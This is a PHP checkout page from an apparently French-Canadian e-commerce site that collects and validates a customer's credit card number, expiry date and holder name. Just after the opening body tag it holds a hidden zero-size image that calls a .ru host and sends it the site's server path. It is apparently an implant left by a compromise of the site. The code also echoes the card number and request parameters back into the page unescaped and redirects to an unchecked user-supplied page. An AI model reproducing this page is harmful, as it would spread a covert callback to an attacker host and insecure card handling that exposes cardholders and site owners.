<?php
/* Programme : chk_carte.php
* Description : Captuer et validation de la carte de crédit du client
* Auteur : Denis Léveillé 	 		  Date : 2007-10-28
*/
include('lib/config.php');

if( !isset($_SESSION[$_SERVER['SERVER_NAME']]) ){
	unset( $_SESSION['redir'] );
	echo "<META HTTP-EQUIV=Refresh CONTENT='0; URL=connexion.php'>";
	exit();

}

if( !isset($_SESSION['Service']) ) {
	echo"<META HTTP-EQUIV=Refresh CONTENT='0; URL=accueil.php'>";
	exit();
}


$monPanier = panierInfos($_SESSION['panier']);          
$TabModPay = 	get_Modepaye( ); 

//echo "Mode paye : ".$_SESSION['paiement']['ModePaye']."<br>";

if( isset($_POST['retour']) && isset($_POST['Commande']) ) {

/*	foreach($_POST as $clé => $valeur ) {
		echo $clé." = ".$valeur."<br>";
	}*/
//	exit();

			// mettre en session le bon mode de paiement
	$_SESSION['paiement']['type_paiement'] = 	$_POST['type_paiement'];
	$_SESSION['paiement']['trnExpMonth']   = 	$_POST['expMonth'];
	$_SESSION['paiement']['trnExpYear']    = 	$_POST['expYear'];
	$_SESSION['paiement']['trnCardNumber'] = 	$_POST['cc_num'];
	$_SESSION['paiement']['ModePaye']		=	$_POST['trnCardType'];
	$_SESSION['paiement']['detenteur']		=	$_POST['detenteur'];
	
	// validation des infos de la carte
	$erreur = 0;
	
	if( $_SESSION['paiement']['trnCardNumber'] != "" ){

		// ***** Nettoyer les caratèresinvalide du numéro
		$_SESSION['paiement']['trnCardNumber'] = preg_replace("/\D/","",$_SESSION['paiement']['trnCardNumber']); 
		$erreur = ValideNoCarteCredit( $_SESSION['paiement']['trnCardNumber'] );	

	} // Si un numéro de carte
	else 
		$erreur=1;
	
	$AnActuel = date('y');						
	$MoisActuel = date('m');						
	// validation du mois d'expiration de la carte 
	if( $_SESSION['paiement']['trnExpMonth'] == "" ) 
		$erreur=2;
	else// validation de l'année d'expiration de la carte 
		if( $_SESSION['paiement']['trnExpYear'] == "" )
			$erreur=3;
		else 
			if( $_SESSION['paiement']['trnExpYear'] < $AnActuel )   
				$erreur=3;
		else 
			if( ($_SESSION['paiement']['trnExpYear'] == $AnActuel) && ( $_SESSION['paiement']['trnExpMonth'] <= $MoisActuel ) )   
				$erreur=2;
			else	
				if( $_SESSION['paiement']['detenteur'] == "" ) 
					$erreur=4;
	
		//champs obligatoires
	if(	$erreur == 0 ) {
		if( strlen($_POST['retour']) )	
			echo "<META HTTP-EQUIV=Refresh CONTENT='0; URL=".$_POST['retour'].".php'>";
		elseif( $_SESSION['Service'] == $_SERVICE_ACHAT )
				echo "<META HTTP-EQUIV=Refresh CONTENT='0; URL=confirme_achat.php'>";
			else
				echo "<META HTTP-EQUIV=Refresh CONTENT='0; URL=confirme_commande.php'>";
		exit();
			
	}


} // POST
//else {

echo "
<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//FR'>
<html  xmlns='http://www.w3.org/1999/xhtml'>
   <head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1' >
		<meta http-equiv='Content-Disposition' content='inline; filename=Liste de client' >
		<meta http-equiv='Content-Description' content='text/html; charset=iso-8859-1' >
		<meta name='author' content='$NomCieCréé' >
		<meta name='copyright' content='copyright © $CopyAn $NomCie' >
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='MAIN'>
	</head>
	<script language='javascript1.2' src='./extra/javafich/disablekeys.js'></script>
	<script language='javascript1.2' src='./extra/javafich/blokclick.js'></script>
	<script language='JavaScript1.2'>addKeyEvent();</script>
<body><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<table  bgcolor='#FFFFFF' width='$Large' cellpadding='0' cellspacing='0' align='$Enligne' border='0' >
		<tr>
		<td>";
	
// HTML pour l'entête du panier, genre <table> avec les entêtes de colonnes          
if( ( $_SESSION['Service'] == $_SERVICE_ACHAT ) && ($monPanier == false) )
	    // HTML pour un panier vide
		echo "<p align=center><font size +2><b>".$txt['votre_panier_est_vide']."</b></font></p><br>";
else {
	   $infosClient = infos_client($_SESSION[$_SERVER['SERVER_NAME']]);
		$_SESSION['paiement']['detenteur']     = 	$infosClient['Prenom'] . " " . $infosClient['Nom'];
?>
		<table width='<?=$Large?>' border='0' bordercolor='#9EA2AB' align='<?=$Enligne?>' cellpadding=2> 
				<tr>
					<td bgcolor='#96B2CB' height='16' width='100%' Valign='top'> 
						<img src='images/panier.gif' width='14' height='13'/> <font color='#FFFFFF' ><b><?=$txt['paiement_en_ligne_securise']?></b></font>
					</td>
				</tr>
		</table>
<?php
		switch( @$erreur ) {
			case 1:	echo "<br><center><font color=red size=3>".$txt['no_carte_invalide']."</font></center>";
						break;
			case 2:	echo "<br><center><font color=red size=3>".$txt['date_expiration_invalide']." (".$txt['mois'].") </font></center>";
						break;
			case 3:	echo "<br><center><font color=red size=3>".$txt['date_expiration_invalide']." (".$txt['annee'].") </font></center>";
						break;
			case 4:	echo "<br><center><font color=red size=3>".$txt['entrez_nom_detenteur_carte']."</font></center>";
						break;
			default :
						break;
		} // Si exist erreur
?>
		<form name="Carte" method="post" action="">
		<table cellpadding='4' border=1 bordercolor='#9EA2AB' cellspacing=0 width=98% align=center>
			<tr bgcolor=ECEEF3>
				<td>
					<table cellpadding=0 cellspacing=0>
						<tr>
							<td nowrap align=left Valign=middle>
								<input type="radio" name="type_paiement" value="card" checked>
								 <?=$txt['paiement_par_carte_de_credit']?>&nbsp;<?=$TabModPay[$_SESSION['paiement']['ModePaye']]?>
							</td>
						</tr>
					</table>
				</td>
			</tr>
			<tr>
				<td valign=top align=left>
					<table cellpadding='14' cellspacing='0'>
						<tr>
							<td>
								<?php 
									echo "<input type='radio' name='trnCardType' value=5 ";
									if( $_SESSION['paiement']['ModePaye'] == 5 ) 
										echo " checked";
									echo ">
										<img src='images/visa.jpg'>&nbsp;&nbsp;&nbsp;
										<input type=radio name='trnCardType' value=6";
									if( $_SESSION['paiement']['ModePaye']== 6 ) 
										echo " checked";
									echo ">
										<img src='images/mastercard.jpg'>"; //&nbsp;&nbsp;&nbsp;
/*		    							<input type=radio name='trnCardType' value=7";
								 	if( @$_SESSION['paiement']['ModePaye'] == 7 ) echo " checked";
									  echo "
										>
										<img src='images/amex.jpg'>";*/
								?>
								<br>
								<table cellpadding='0' cellspacing='0'>
									<tr>
										<td>
											<br>
											<?=$txt['numero_de_carte']?>
										</td>
										<td>
		 									<br>
											<?=$txt['date_expiration']?>
										</td>
									</tr>
									<tr>
										<td>
											<input type=text AUTOCOMPLETE="OFF" name="cc_num" 
												<?php 
													if( @$_SESSION['paiement']['trnCardNumber'] !== "" ){
														echo "value='".@$_SESSION['paiement']['trnCardNumber']."' ";
													}
												?>
												>&nbsp;&nbsp;	&nbsp;&nbsp;
										</td>
										<td>
											<select name="expMonth">
												<option value=''>
													<?=$txt['mois']?>
												 </option>
												<?php
													for($i=1;$i<=12;$i++) {
														$j = sprintf( "%02d", $i );
														echo "<option value='$j' ";
														if( @$_SESSION['paiement']['trnExpMonth'] == $j ) 
															echo " SELECTED";
														echo " >$j</option>";
													}  
												?>
											</select>
										&nbsp;&nbsp;
											<select name="expYear">
												<option value=''>
													<?=$txt['annee']?>
												 </option>
											
												<?php
													$Dat = date("y");
													for($i=$Dat;$i<=($Dat+10);$i++) {
														$j = sprintf( "%02d", $i );
														echo "<option value='$j' ";
														if( @$_SESSION['paiement']['trnExpYear'] == $j ) 
															echo " SELECTED";
														echo " >".sprintf( "20%02d", $i )."</option>";
													}  
												?>
											</select>		
										</td>
									</tr>
									<tr>
										<td colspan=2>
										<br>
											<?=$txt['prenom_et_nom_du_detenteur_dela_carte']?>
										</td>
									</tr>
									<tr>
										<td colspan='2'>
											<input type='text' name='detenteur' size='50' maxlength="50"
												<?php 
													if( @$_SESSION['paiement']['detenteur'] !== "" ){
														echo "value='".@$_SESSION['paiement']['detenteur']."' ";
													}
												?>
												>
										</td>
									</tr>
								</table>
		
							</td>
						</tr>
					</table>
					
				</td>
			</tr>
		 </table>
		<br>
		  <center>
	 		<input type='hidden' name='retour' value='<?=@$_GET['retour']?>'>
<?php
		if( isset($_GET['retour']) && strlen($_GET['retour']) ) 
			echo "<input type='submit' name='Commande' value='".$txt['retour_etape_finale']."'  class='form1'>";
		else
			echo "<input type='submit' name='Commande' value='".$txt['passez_a_letape_suivante']."' class='form1'/>";
		echo "
		 </center>
		 </form>";
} // Si un panier PLEIN
?>
		<table width="100%" border="0" cellspacing="0" cellpadding="0">
			<tr>
				<td width="50%" nowrap align="left" valign="bottom" class="normalTextBold">
					<p><a href="http://www.moneris.com" target="_blank"><img src="images/logo_moneris.gif" width="188" height="77" border="0"/></a></p>
				</td>
				<td>
					&nbsp;
				</td>
				<td width="50%" nowrap align="right" valign="bottom" class="normalTextBold">
					<script src="https://siteseal.thawte.com/cgi/server/thawte_seal_generator.exe"></script>
					<a style="color:#AD0034" target="_new" href="http://www.thawte.com/digital-certificates/"><br/>
					<span style="font-family:arial; font-size:8px; color:#AD0034"><?=$txt['Au_Sujet_SSL']?></span></a>
				</td>
			</tr>
      </table>
<?php
echo "
		</td>
		</tr>
	</table>
<script language='JavaScript1.2'>

	function Rafraichie(){
			window.location.reload();
	}

</script>
</body>
</html>";
	
// } // Si pas de POST
?>